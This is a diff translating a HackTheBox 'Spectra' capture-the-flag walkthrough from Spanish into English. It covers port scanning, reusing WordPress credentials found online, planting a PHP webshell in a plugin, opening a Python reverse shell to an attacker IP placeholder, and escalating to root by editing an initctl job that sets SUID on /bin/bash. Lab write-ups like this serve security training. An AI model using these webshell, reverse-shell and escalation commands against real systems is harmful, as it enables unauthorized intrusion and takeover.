@@ -4,126 +4,123 @@
   <img src='img/image.png' width='400' alt='Machine Image'>
 </div>
 
-## Escaneo de puertos
+## Port Scan
 
-Uso de [nmap](https://nmap.org) para escaneo de puertos por atravez de protocolos TCP
+Using [nmap](https://nmap.org) for full TCP port scan:
 
 ```bash
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.229 -oG allPorts
 ```
 
 <div align='center'>
-  <img src='img/allportsTCP.png' width='600' alt='Escaneo de puertos'>
+  <img src='img/allportsTCP.png' width='600' alt='Port scan'>
 </div>
 
-## Escaneo de servicios en puertos descubiertos
+## Service Scan on Discovered Ports
 
-En el paso anterior descubrimos 3 puertos abiertos que consecuentemente deben ser analizados atravez de scripts basicos de reconocimiento (-C) junto a las versiones usadas por estos servicios (-V)
+Three open ports found in the previous step. Running basic recon scripts (`-sC`) and version detection (`-sV`):
 
 ```bash
  nmap -sCV -p22,80,3306 10.10.10.229 -vvv -oN targeted
 ```
 
 <div align='center'>
-  <img src='img/targeted.png' width='600' alt='Escaneo de servicios en puertos descubiertos'>
+  <img src='img/targeted.png' width='600' alt='Service scan'>
 </div>
 
-## Enumeracion de Web
+## Web Enumeration
 
-Visitamos la pagina y revisamos que encontramos
+Visiting the page to see what's exposed:
 
 <div align='center'>
-  <img src='img/page.png' width='600' alt='Enumeracion de Web'>
+  <img src='img/page.png' width='600' alt='Web enumeration'>
 </div>
 
-## Listado de directorios
+## Directory Listing
 
-En el paso anterior encontramos dos rutas, la que dice test nos lleva a un index.php, pero al borrar en la url index.php notamos que tenemos acceso a listar todo lo existente en el directorio /testing
+The previous step revealed two paths. The `/test` path leads to an `index.php`, but removing `index.php` from the URL exposes directory listing on `/testing`:
 
 <div align='center'>
-  <img src='img/directory.png' width='600' alt='Listado de directorios'>
+  <img src='img/directory.png' width='600' alt='Directory listing'>
 </div>
 
 <div align='center'>
-  <img src='img/listing.png' width='400' alt='Machine Image'>
+  <img src='img/listing.png' width='400' alt='Listing'>
 </div>
 
-## Descubrimiento de credenciales
+## Credential Discovery
 
-En el archivo que fue guardado por nano podemos encontrar credenciales al verlo atraves de la fuente de la pagina (Ctrl + u)
+A file saved by nano contains credentials visible through the page source (`Ctrl+U`):
 
 <div align='center'>
-  <img src='img/webcreds.png' width='600' alt='Descubrimiento de credenciales'>
+  <img src='img/webcreds.png' width='600' alt='Credential discovery'>
 </div>
 
-## Resolucion estatica
+## Static DNS Resolution
 
-Al pasar el mouse encima de "Software Issue Tracker" vemos que nos lleva a spectra.htb pero debemos agregar esa ruta a nuestro /etc/hosts para resolver el dominio
+Hovering over "Software Issue Tracker" reveals a link to `spectra.htb` — add it to `/etc/hosts` to resolve the domain:
 
 ```bash
  echo "10.10.10.229 spectra.htb" | sudo tee -a /etc/hosts
 ```
 
-## Enumeracion de wordpress
+## WordPress Enumeration
 
-Ahora una vez resuelto el dominio spectra.htb podemos ver una pagina de wordpress donde encontramos
-1. Un usuario llamado administrator
-2. Una ruta que no lleva al panel de login
-
-<div align='center'>
-  <img src='img/wordpresspage.png' width='600' alt='Enumeracion de wordpress'>
-</div>
-
-## Re-uso de credenciales
-
-Una vez en el panel de login usaremos el usuario "administrator" con la contrasena encontrada anteriormente "devteam01"
-Para consiguientemente darl click en "Remind me later"
+After resolving `spectra.htb`, a WordPress site is visible. Two findings:
+1. Username: `administrator`
+2. Path to the login panel
 
 <div align='center'>
-  <img src='img/verificationBypass.png' width='600' alt='Re-uso de credenciales'>
+  <img src='img/wordpresspage.png' width='600' alt='WordPress enumeration'>
+</div>
+
+## Credential Reuse
+
+Logging into the WordPress admin panel with user `administrator` and the previously found password `devteam01`. Click "Remind me later" when prompted:
+
+<div align='center'>
+  <img src='img/verificationBypass.png' width='600' alt='Credential reuse'>
 </div>
 
 <div align='center'>
-  <img src='img/dashboard.png' width='400' alt='Machine Image'>
+  <img src='img/dashboard.png' width='400' alt='Dashboard'>
 </div>
 
-## Injeccion remota de comandos
+## Remote Code Injection
 
-Una vez logueados como admin en el panel de control nos dirijimos a Plugin Editor para editar el pluging llamado akismet.php
-donde agregaremos la siguiente linea para aplicar un RCI (Remote Code Injection)
+Logged in as admin, navigate to **Plugin Editor** and edit `akismet.php`. Add this line to inject a webshell:
 
 ```bash
  system($_GET['cmd']);
 ```
 
 <div align='center'>
-  <img src='img/codeinject.png' width='600' alt='Injeccion remota de comandos'>
+  <img src='img/codeinject.png' width='600' alt='Code injection'>
 </div>
 
 
-## URL Revershell
+## Reverse Shell via URL
 
-Una vez editado y actualizado el plugin akismet.php
-1. Nos ponemos en escucha con ncat -nlvp 4444
-2. Nos dirigmos a la ruta del plugin editado http://spectra.htb/main/wp-content/plugins/akismet/akismet.php
-3. Agregamos el parametro que llama a la injecion en la url ?cmd=
-4. y seguido en la url agregamos la revershell donde debes cambiar el campo <TU IP> por la IP que tengas con la VPN de Hackthebox
+After saving and activating the edited `akismet.php`:
+1. Start listener: `ncat -nlvp 4444`
+2. Navigate to: `http://spectra.htb/main/wp-content/plugins/akismet/akismet.php`
+3. Append `?cmd=` to trigger the injected shell
+4. Use the URL to deliver a reverse shell (replace `<YOUR_IP>` with your HackTheBox VPN IP):
 
 ```bash
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
 <div align='center'>
-  <img src='img/revershell.png' width='600' alt='URL Revershell'>
+  <img src='img/revershell.png' width='600' alt='Reverse shell'>
 </div>
 
-## Archivos criticos
+## Critical Files
 
-Una vez logueados como el usuario nginx vemos en la ruta /opt/ un archivo llamado "autologin.conf.orig"
-que toma un contrasena que se aloja en "/etc/autologin"
+Logged in as the `nginx` user, checking `/opt/` reveals a file called `autologin.conf.orig` which reads a password from `/etc/autologin`:
 
 <div align='center'>
-  <img src='img/passfile.png' width='600' alt='Archivos criticos'>
+  <img src='img/passfile.png' width='600' alt='Critical files'>
 </div>
 
 
@@ -133,50 +130,50 @@ que toma un contrasena que se aloja en "/etc/autologin"
 SummerHer*********
 ```
 <div align='center'>
-  <img src='img/SSHkatie.png' width='400' alt='Machine Image'>
+  <img src='img/SSHkatie.png' width='400' alt='SSH as katie'>
 </div>
 
-## Enumeracion de privilegios
+## Privilege Enumeration
 
-1. Hacemos uso de sudo -l para ver a que binario tenemos permiso de usar con permisos de root
-2. Usamos el comando id para saber a que grupos pertenecemos 
-3. Y al ver que tenemos acceso al binario initctl y hacemos parte del grupo developers buscamos de forma recursiva por archivos que pertenezcan al grupo developers y encontramos tareas usadas con el initctl
+1. `sudo -l` — check which binaries can be run as root
+2. `id` — check group membership
+3. We have access to `initctl` binary and belong to the `developers` group — search for files owned by that group:
 
 ```bash
  find / -group developers 2>/dev/null | xargs ls -l
 ```
 
 <div align='center'>
-  <img src='img/privenum.png' width='600' alt='Enumeracion de privilegios'>
+  <img src='img/privenum.png' width='600' alt='Privilege enumeration'>
 </div>
 
-## Init explotation
+## Init Exploitation
 
-De los archivos encontrados anteriormente podemos tomar cualquiera para el siguiente paso, pero para este ejercicio tomaremos test9.conf, lo abrimos con nano y agregaremos una linea al archivos para que cuando iniciemos la tarea como root usando initctl se ejecute el comando que estamos injectando como root que en este caso sera cambiar los permisos de /bin/bash
+From the files found, edit `test9.conf` with nano and add a line to execute a command as root when the task starts via `initctl`. The injected command sets the SUID bit on `/bin/bash`:
 
 ```bash
  exec chmod u+s /bin/bash
 ```
 
 <div align='center'>
-  <img src='img/initexpotation.png' width='600' alt='Init explotation'>
+  <img src='img/initexpotation.png' width='600' alt='Init exploitation'>
 </div>
 
-## Escalacion de privilegios
+## Privilege Escalation
 
-Una vez modificado el test9.conf
-1. Guardamos el archivo
-2. Verificamos los permisos
-3. Iniciamos el test9 como root
-4. Verificamos que los permisos de /bin/bash hayan sido modificados
-5. Una vez verificado nos logueamos como root usando bash -p
+After modifying `test9.conf`:
+1. Save the file
+2. Verify permissions
+3. Start `test9` as root
+4. Verify `/bin/bash` now has SUID set
+5. Spawn a root shell with `bash -p`
 
 ```bash
  sudo -u root /sbin/initctl start test9
 ```
 
 <div align='center'>
-  <img src='img/rootshell.png' width='600' alt='Escalacion de privilegios'>
+  <img src='img/rootshell.png' width='600' alt='Root shell'>
 </div>
 
 <div align='center'>
